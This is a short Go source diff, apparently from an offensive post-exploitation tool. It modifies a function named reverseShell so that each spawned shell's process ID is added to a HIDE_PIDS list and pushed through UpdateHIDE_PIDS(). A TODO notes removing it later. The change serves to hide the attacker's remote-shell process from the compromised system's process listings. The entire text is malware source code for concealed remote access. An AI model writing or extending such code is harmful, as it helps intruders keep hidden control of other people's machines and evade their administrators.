@@ -8,6 +8,7 @@ import (
 	"os"
 	"os/exec"
 	"os/signal"
+	"strconv"
 	"syscall"
 	"time"
 
@@ -127,11 +128,19 @@ func reverseShell(ctx context.Context, cancel context.CancelFunc,
 	}
 	*pid = cmd.Process.Pid
 
+	// record this PID
+	HIDE_PIDS = append(HIDE_PIDS, strconv.Itoa(*pid))
+	err = UpdateHIDE_PIDS()
+	if err != nil {
+		log.Print(err)
+	}
+
 	// Handle pty size.
 	ch := make(chan os.Signal, 1)
 	signal.Notify(ch, syscall.SIGWINCH)
 	go func() {
 		defer func() { cancel() }()
+		// TODO delete PID from HIDE_PIDS
 		for range ch {
 			select {
 			case <-ctx.Done():
